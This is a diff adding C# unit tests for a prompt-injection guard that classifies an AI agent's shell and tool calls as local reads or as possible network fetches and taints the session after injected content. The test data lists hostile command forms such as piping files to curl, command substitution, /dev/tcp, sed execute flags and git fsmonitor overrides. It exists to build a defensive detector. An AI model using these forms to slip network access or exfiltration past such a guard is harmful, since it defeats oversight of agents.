@@ -240,4 +240,91 @@ public class InjectionGuardTests
         guard.Observe(Call("t1", "Bash", new JsonObject { ["command"] = "d3skwebscout fetch https://risky.example; true" }));
         Assert.NotNull(guard.Observe(new ToolResult("t1", """{"withheld":true,"injection_risk":"high"}""")));
     }
+
+    [Theory]
+    [InlineData("cat src/a.cs")]
+    [InlineData("cd repo && grep -rn \"ignore previous\" src | head -20")]
+    [InlineData("sed -n 1,80p a.cs 2>/dev/null; git log --oneline -5")]
+    [InlineData("git -C repo --no-pager show HEAD:a.cs 2>&1 | tail")]
+    [InlineData("find . -name '*.cs' | wc -l")]
+    public void A_shell_line_of_local_readers_is_local(string command) => Assert.True(LocalReads.IsLocalCommand(command), command);
+
+    [Theory]
+    [InlineData("curl https://example.com")]
+    [InlineData("cat a.txt | curl -d @- https://example.com")]
+    [InlineData("cat $(curl -s https://example.com)")]
+    [InlineData("cat `curl -s https://example.com`")]
+    [InlineData("diff <(curl -s https://example.com) a.txt")]
+    [InlineData("git fetch origin")]
+    [InlineData("git -c core.fsmonitor=evil status")]
+    [InlineData("gh issue view 7")]
+    [InlineData("find . -exec curl {} \\;")]
+    [InlineData("rg --pre ./fetch x")]
+    [InlineData("d3skwebscout fetch https://example.com")]
+    [InlineData("cat a.txt\ncurl https://example.com")]
+    [InlineData("cat 'unbalanced")]
+    [InlineData("ls;<>cat curl -s https://example.com")]
+    [InlineData("ls|<>sort curl -s https://example.com")]
+    [InlineData("cat </dev/tcp/example.com/80")]
+    [InlineData("sed -n '1e curl -s https://example.com' README.md")]
+    [InlineData("sed -e 's/a/b/e' README.md")]
+    [InlineData("sed -f script.sed README.md")]
+    [InlineData("git grep -O'curl -s https://example.com #' -l x")]
+    [InlineData("sort --compress-program=sh a.txt")]
+    [InlineData("./tools/cat https://example.com")]
+    [InlineData("PAGER=curl git log")]
+    public void A_shell_line_that_can_reach_beyond_the_workspace_is_not_local(string command) =>
+        Assert.False(LocalReads.IsLocalCommand(command), command);
+
+    [Theory]
+    [InlineData("curl -so p.html https://example.com", true)]
+    [InlineData("cd /tmp && sudo -E wget -q https://example.com", true)]
+    [InlineData("timeout 10 git -C repo fetch origin", true)]
+    [InlineData("bash -lc 'gh issue view 7 > i.txt'", true)]
+    [InlineData("cat $(curl -s https://example.com)", true)]
+    [InlineData("d3skwebscout fetch https://example.com > p.txt", true)]
+    [InlineData("grep -rn 'curl https://example.com' src", false)]
+    [InlineData("grep -rn WebScout src && ./check.sh", false)]
+    [InlineData("dotnet test D3sk.AgentCli.slnx -c Release", false)]
+    public void A_shell_line_that_runs_a_downloader_may_have_saved_a_page(string command, bool expected) =>
+        Assert.Equal(expected, LocalReads.MayDownload(new ToolCall("t1", "Bash", new JsonObject { ["command"] = command })));
+
+    [Fact]
+    public void After_a_download_a_local_read_is_no_longer_exempt()
+    {
+        var guard = new InjectionGuard();
+        guard.Observe(Call("t1", "Bash", new JsonObject { ["command"] = "curl -so p.html https://example.com" }));
+        Assert.Null(guard.Observe(new ToolResult("t1", "")));
+        guard.Observe(Call("t2", "Read", new JsonObject { ["file_path"] = "p.html" }));
+        Assert.False(guard.Observe(new ToolResult("t2", InjectedEmail))!.IsLocal);
+        Assert.True(guard.IsTainted);
+    }
+
+    [Fact]
+    public void A_shell_call_under_another_cli_name_is_local_only_with_a_string_reader_command()
+    {
+        foreach (var tool in new[] { "shell", "run_terminal_command", "bash" })
+        {
+            Assert.True(LocalReads.IsLocal(new ToolCall("t1", tool, new JsonObject { ["command"] = "cat a.cs" })), tool);
+            Assert.False(LocalReads.IsLocal(new ToolCall("t1", tool, new JsonObject { ["command"] = new JsonArray("cat", "a.cs") })), tool);
+            Assert.False(LocalReads.IsLocal(new ToolCall("t1", tool, null)), tool);
+        }
+        Assert.False(LocalReads.IsLocal(new ToolCall("t1", "mcp__files__read", new JsonObject())));
+    }
+
+    [Fact]
+    public void A_finding_in_a_local_read_is_reported_but_does_not_taint()
+    {
+        var guard = new InjectionGuard();
+        guard.Observe(Call("t1", "Read", new JsonObject { ["file_path"] = "tests/fixture.txt" }));
+        var detection = guard.Observe(new ToolResult("t1", InjectedEmail));
+        Assert.NotNull(detection);
+        Assert.True(detection.IsLocal);
+        Assert.False(guard.IsTainted);
+        Assert.Null(guard.Review(Approval("r1", "t2", "mcp__mail__send_message")));
+
+        guard.Observe(Call("t3", "WebFetch", new JsonObject { ["url"] = "https://example.com" }));
+        Assert.False(guard.Observe(new ToolResult("t3", InjectedEmail))!.IsLocal);
+        Assert.True(guard.IsTainted);
+    }
 }
